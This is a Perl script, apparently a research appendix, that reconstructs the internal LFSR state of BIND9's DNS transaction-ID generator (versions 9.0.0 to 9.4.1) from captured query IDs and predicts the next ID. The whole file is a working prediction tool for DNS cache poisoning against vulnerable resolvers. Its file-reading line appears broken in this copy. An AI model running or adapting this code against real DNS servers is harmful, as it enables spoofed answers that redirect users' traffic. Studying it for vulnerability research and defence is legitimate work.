# For BIND9 v9.2.3-9.4.1:
$tap1=0x80000057;
$tap2=0x80000062;

# For BIND9 v9.0.0-9.2.2:
# $tap1=0xc000002b; # (0x80000057>>1)|(1<<31)
# $tap2=0xc0000061; # (0x800000c2>>1)|(1<<31)

$initial_guess_bits=6;
@cand_lfsr1=();
@cand_lfsr2=();

use Time::HiRes qw(gettimeofday);

@txid=();

# Read all data from file. It is assumed to be in the format generated 
# by the XSL transformation described in appendix A.

$count=0;
open(FD,$ARGV[0]) or die "ERROR: Can't open file $ARGV[0]";
while(my $line=)
{
	# File format: TXID[4 hex] (ignore everything beyond those 4 digits) 
	
	if ($line=~/^([0-9a-fA-F]{4})/x)
	{
		push @txid,hex($1);
		$count++;
	}
	else
	{
		die "ERROR: Can't parse line at count=$count.\n";
	}
}
close(FD);

print "INFO: Found $count DNS queries in file.\n";

sub next_trxid
{
	my ($lfsr1,$lfsr2)=@_;
	my $val;
	for (my $i=0;$i<$count+1;$i++)
	{
		$val=($lfsr1^$lfsr2) & 0xFFFF;
		$skip1=$lfsr1 & 1;
		$skip2=$lfsr2 & 1;
		for (my $j1=0;$j1<=$skip2;$j1++)		
		{
			$lfsr1 = ($lfsr1>>1) ^ (($lfsr1 & 1)*$tap1);
		}
		for (my $j2=0;$j2<=$skip1;$j2++)		
		{
			$lfsr2 = ($lfsr2>>1) ^ (($lfsr2 & 1)*$tap2);
		}
		#printf "%04x ",$val;
	}
	return $val;
}

sub verify
{
	my ($lfsr1,$width1,$lfsr2,$width2)=@_;

	for (my $i=0;$i<$count;$i++)
	{
		my $cand=($lfsr1^$lfsr2) & 0xFFFF;
		my $min_width=($width1<=$width2) ? $width1 : $width2;
		$min_width=($min_width<=16) ? $min_width : 16;
		if ($min_width<=0)
		{
			return 1;
		}
		my $mask=(1<<$min_width)-1;
		if (($cand & $mask) != ($txid[$i] & $mask))
		{
			return 0;
		}

		$skip1=$lfsr1 & 1;
		$skip2=$lfsr2 & 1;
		for (my $j1=0;$j1<=$skip2;$j1++)		
		{
			$lfsr1 = ($lfsr1>>1) ^ (($lfsr1 & 1)*$tap1);
			if ($width1<32)
			{
				$width1--;
			}
		}
		for (my $j2=0;$j2<=$skip1;$j2++)		
		{
			$lfsr2 = ($lfsr2>>1) ^ (($lfsr2 & 1)*$tap2);
			if ($width2<32)
			{
				$width2--;
			}
		}
	}
	return 1;
}

sub phase2
{
	my ($lfsr1,$width1,$lfsr2,$width2)=@_;

	my $motion_detected=0;

	if ($width1<32)
	{
		my $guess_0=verify($lfsr1|(0<<$width1),$width1+1,$lfsr2,$width2);
		my $guess_1=verify($lfsr1|(1<<$width1),$width1+1,$lfsr2,$width2);
		if ($guess_0 ^ $guess_1)
		{
			#Exactly one is correct. So we know the bit.
			$motion_detected=1;
			if ($guess_1)
			{
				$lfsr1=$lfsr1|(1<<$width1);
			}
			$width1++;
		}
		elsif ((!$guess_0) and (!$guess_1))
		{
			# Inconsistent state, hence wrong guess in the first place
			return 0;
		}
	}

	if ($width2<32)
	{
		my $guess_0=verify($lfsr1,$width1,$lfsr2|(0<<$width2),$width2+1);
		my $guess_1=verify($lfsr1,$width1,$lfsr2|(1<<$width2),$width2+1);
		if ($guess_0 ^ $guess_1)
		{
			#Exactly one is correct. So we know the bit.
			$motion_detected=1;
			if ($guess_1)
			{
				$lfsr2=$lfsr2|(1<<$width2);
			}
			$width2++;
		}
		elsif ((!$guess_0) and (!$guess_1))
		{
			# Inconsistent state, hence wrong guess in the first place
			return 0;
		}
	}

	if (($width1==32) and ($width2==32))
	{
		# Final verification
		if (verify($lfsr1,32,$lfsr2,32))
		{
			push @cand_lfsr1,$lfsr1;
			push @cand_lfsr2,$lfsr2;
			return 1;
		}
		else
		{
			# false alarm
			return 0;
		}
	}

	if ($motion_detected)
	{
		# At least one width was improved.
		return phase2($lfsr1,$width1,$lfsr2,$width2);
	}
	else
	{
		# Resort to bit guessing.
		if ($width1<32)
		{
			# Guessing another bit in LFSR1 and continuing...
			return 
phase2($lfsr1|(0<<$width1),$width1+1,$lfsr2,$width2)+
				phase2($lfsr1|(1<<$width1),$width1+1,$lfsr2,$width2);
		}
		else
		{
			# Guessing another bit in LFSR2 and continuing...
			return 
phase2($lfsr1,$width1,$lfsr2|(0<<$width2),$width2+1)+
				phase2($lfsr1,$width1,$lfsr2|(1<<$width2),$width2+1);
		}		
	}
}

my $start_time=gettimeofday();

my $good=0;

for (my $lfsr1=0;$lfsr1<(1<<$initial_guess_bits);$lfsr1++)
{
	my $lfsr2=($txid[0]^$lfsr1) & ((1<<$initial_guess_bits)-1);
	if (verify($lfsr1,$initial_guess_bits,$lfsr2,$initial_guess_bits))
	{
		$good+=
phase2($lfsr1,$initial_guess_bits,$lfsr2,$initial_guess_bits);
	}
}

my $end_time=gettimeofday();

print "INFO: ".$good." candidates found:\n";
for (my $k=0;$k<$good;$k++)
{
	printf "***  LFSR1=0x%08x  LFSR2=0x%08x  Next_TRXID=0x%04x  ***\n",
		$cand_lfsr1[$k],$cand_lfsr2[$k],
next_trxid($cand_lfsr1[$k],$cand_lfsr2[$k]);
}

print "INFO: Elapsed time: ".($end_time-$start_time)." seconds\n";

exit(0);
